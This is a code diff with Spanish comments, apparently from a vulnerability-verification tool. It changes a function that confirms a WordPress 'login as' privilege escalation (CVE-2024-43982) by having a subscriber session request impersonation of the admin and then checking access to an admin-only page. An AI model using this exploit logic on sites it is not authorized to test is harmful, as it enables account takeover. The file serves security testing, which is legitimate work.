@@ -661,12 +661,17 @@ def verify_wordpress_direct_login_as(
     ("login as", p.ej. CVE-2024-43982 en Login As Users: `gwslau_login_as_user_action()` sin
     comprobacion de capability), en vez de cambiar una credencial. Aqui NO hay password nueva que
     confirmar por un segundo login (ver verify_wordpress_account_takeover() para ese otro caso);
-    la confirmacion es doble, con la MISMA sesion del atacante (sin re-loguearse):
-      1. la cookie de sesion de WordPress cambia tras la peticion (el servidor literalmente
-         sustituyo la autenticacion del subscriber por la del admin), Y
-      2. esa misma sesion, que antes de la peticion NO podia ver `confirm_path` (pagina
-         solo-admin), ahora SI la ve de verdad (HTTP 200, sin redirigir a wp-login.php y sin el
-         mensaje de WordPress de 'no tienes permiso').
+    la confirmacion principal es, con la MISMA sesion del atacante (sin re-loguearse): esa sesion,
+    que antes de la peticion NO podia ver `confirm_path` (pagina solo-admin), ahora SI la ve de
+    verdad (HTTP 200, sin redirigir a wp-login.php y sin el mensaje de WordPress de 'no tienes
+    permiso') -- ya se confirmo justo antes que esa misma pagina estaba denegada, asi que esta
+    transicion por si sola es prueba fuerte. Se registra TAMBIEN si alguna cookie de la sesion
+    cambio (evidencia de apoyo, no un requisito): distintos plugins suplantan de formas distintas
+    -- algunos reemplazan la cookie de auth de WordPress (wordpress_logged_in_*), otros (como
+    Login As Users, CVE-2024-43982: gwslau_login_as_user_action() guarda el ID en $_SESSION de PHP
+    y lo aplica en cada peticion via el hook 'init') ni tocan esa cookie, solo la sesion nativa de
+    PHP -- exigir el cambio de UNA cookie concreta habria dado un falso negativo contra ese CVE
+    real (confirmado probando contra el plugin de verdad).
     Limitacion conocida: si el endpoint real exige un nonce de WordPress (`_wpnonce`) que no esta
     entre `parameters`, la peticion fallara con ese nonce invalido -- hay que raspar el nonce del
     HTML de la pagina que lo genera y pasarlo en `parameters` (trabajo futuro: hacerlo aqui
@@ -707,8 +712,9 @@ def verify_wordpress_direct_login_as(
                                    "pueda ver; con el valor dado no distingue nada")
             return res
 
-        cookie_before = {c.name: c.value for c in boot.sub_sess.cookies
-                         if c.name.startswith("wordpress_logged_in_")}
+        # TODAS las cookies, no solo wordpress_logged_in_*: distintos plugins suplantan por vias
+        # distintas (ver docstring) -- esto es evidencia de apoyo, no el criterio de VERIFICADO.
+        cookie_before = {c.name: c.value for c in boot.sub_sess.cookies}
         payload = dict(parameters) if isinstance(parameters, dict) else {p: "" for p in (parameters or [])}
         payload[id_param] = boot.admin_id
         m = (http_method or "GET").upper()
@@ -730,8 +736,7 @@ def verify_wordpress_direct_login_as(
             res.detail = f"fallo enviando la peticion: {e}"
             return res
 
-        cookie_after = {c.name: c.value for c in boot.sub_sess.cookies
-                        if c.name.startswith("wordpress_logged_in_")}
+        cookie_after = {c.name: c.value for c in boot.sub_sess.cookies}
         cookie_changed = cookie_before != cookie_after
         res.evidence["cookie_sesion_cambio"] = cookie_changed
         step("confirmando: la MISMA sesion del atacante, sin volver a loguearse, intenta ver "
@@ -742,16 +747,19 @@ def verify_wordpress_direct_login_as(
                   and "sorry, you are not allowed" not in post_resp.text.lower())
         res.evidence["confirm_path"] = confirm_path
         res.evidence["confirm_status_code"] = post_resp.status_code
-        if post_ok and cookie_changed:
+        if post_ok:
             res.verified = True
             res.ok = True
-            res.detail = (f"LOGIN-AS confirmado: la sesion de '{boot.sub_user}' (subscriber) paso "
-                          f"a tener acceso real a '{confirm_path}' (solo-admin) tras la peticion, "
-                          f"sin volver a loguearse -- la cookie de sesion cambio de verdad "
-                          f"(admin_id={boot.admin_id})")
+            res.detail = (f"LOGIN-AS confirmado: la sesion de '{boot.sub_user}' (subscriber), que "
+                          f"segundos antes NO podia ver '{confirm_path}', paso a tener acceso real "
+                          f"tras la peticion -- SIN volver a loguearse (admin_id={boot.admin_id})")
             res.evidence["confirmacion"] = (f"la misma requests.Session, sin re-login, paso de "
-                                            f"'denegado' a '200 OK' en {confirm_path}, y su "
-                                            f"cookie wordpress_logged_in_* cambio tras la peticion")
+                                            f"'denegado' a '200 OK' en {confirm_path}"
+                                            + (" (y alguna cookie de la sesion cambio tras la "
+                                               "peticion, evidencia de apoyo)" if cookie_changed
+                                               else " (sin cambio de cookie detectable -- este "
+                                               "plugin suplanta por otra via, p.ej. sesion nativa "
+                                               "de PHP en vez de la cookie de auth de WordPress)"))
             step("VERIFICADO: la sesion del atacante ahora tiene acceso de administrador.")
             step("capturando pantalla: la MISMA sesion, ahora con acceso de administrador "
                  "(prueba final)...")
@@ -762,13 +770,6 @@ def verify_wordpress_direct_login_as(
                    f"Step 5: LOGIN-AS confirmed -- '{boot.sub_user}'s session (which could not see "
                    f"this page before the attack) now accesses '{confirm_path}' without logging "
                    f"in again.")
-        elif post_ok and not cookie_changed:
-            res.ok = True
-            res.verified = False
-            res.detail = (f"{confirm_path} respondio 200 tras el ataque pero la cookie de sesion "
-                          f"NO cambio -- posible falso positivo (p.ej. confirm_path se volvio "
-                          f"accesible por otro motivo); no se marca VERIFICADO sin la cookie "
-                          f"como prueba adicional")
         else:
             res.ok = True
             res.detail = (f"la peticion se envio (status {resp.status_code}) pero {confirm_path} "
